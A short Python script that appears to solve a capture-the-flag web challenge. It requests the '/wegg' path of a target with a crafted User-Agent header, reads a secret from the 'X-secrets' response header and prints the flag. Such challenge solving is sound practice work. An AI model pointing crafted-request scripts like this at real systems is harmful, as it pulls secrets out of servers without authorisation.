#!/usr/bin/env python3

import sys
import requests

url = sys.argv[1]
if not url.startswith('http'):
    url = 'http://' + url

url += "/wegg"

headers = {
    'User-Agent': 'flag'
}
r = requests.get(url, headers=headers)
code = r.headers['X-secrets']
print(code[code.index('CTD'):])
